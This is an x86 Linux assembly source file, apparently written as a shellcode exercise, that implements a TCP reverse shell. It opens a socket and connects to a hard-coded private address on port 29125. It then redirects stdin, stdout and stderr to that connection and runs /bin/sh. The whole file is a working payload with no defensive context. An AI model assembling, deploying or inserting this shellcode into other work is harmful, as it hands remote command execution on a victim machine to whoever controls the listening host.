; reverse_shell_tcp.asm
;
; Author: Dennis Tan
; Date: 03-May-2020

global _start

section .text
    _start:
       
        ; socketcall(int call, unsigned long *args);
        ; socket(AF_INT, SOCK_STREAM, 0);
        xor ebx, ebx            ; clear ebx register for multiplication
        mul ebx                 ; mul w 0 and store in eax edx
        mov al, 0x66            ; syscall for socketcall
        
        push ebx                ; push value for protocol
        push 0x01               ; push value for int type SOCK_STREAM
        push 0x02               ; push value for int domain AF_INET
        mov ecx, esp            ; save argument into ecx register
        
        mov bl, 0x01            ; set SYS_SOCKET in ebx register
        int 0x80                ; invoke syscall for socketcall with sys_bind
        mov esi, eax            ; save sockfd into esi for later use

        ; socketcall(int call, unsigned long *args);
        ; connect(int sockfd, const struct sockaddr *addr, sizeof(server_addr);
        xor ebx, ebx            ; clear ebx register
        xor eax, eax            ; clear eax register
        mov al, 0x66            ; syscall for socketcall

        xor ecx, ecx            ; clear ecx register
        mov ecx, 0x7201A9C1     ; 193.169.1.113
        sub ecx, 0x01010101     ; subtract 1.1.1.1
        push ecx
        push word 0xC571        ; port 29125
        push word 0x0002        ; push AF_INET
        mov ecx, esp            ; save argument to ecx

        push byte 16            ; addrlen
        push ecx                ; push sockaddr
        push esi                ; push sockfd

        mov bl, 0x03            ; syscall for connect()
        mov ecx, esp            ; save argument to ecx
         
        int 0x80                ; invoke syscall for connect
	
        ; dup2(sockfd, int newfd);
        xor ebx, ebx            ; clear ebx register
        mul ebx                 ; clear eax edx register
        xor ecx, ecx            ; clear ecx register
        mov ebx, esi            ; store sockfd
        mov cl, 0x02            ; 2 stderr, 1 stdout, 0 stdin
loop:
        mov al, 0x3F            ; syscall for dup2
        int 0x80                ; invoke syscall for dup2
        dec ecx                 ; decrease ecx
        jns loop                ; keep looping if ecx >= 0

        ; execve("/bin/sh", char *const argv[], char *const envp[]);
        xor eax, eax            ; clear eax register
        push eax                ; null-terminator for pathname
        push 0x68732f2f         ; hs//
        push 0x6e69622f         ; nib/
        
        mov edx, eax            ; store NULL into envp
        mov ebx, esp            ; save pathname to ebx
        mov ecx, eax            ; save argument 
        mov al, 0xb             ; syscall for execve
        int 0x80                ; invoke syscall for execve
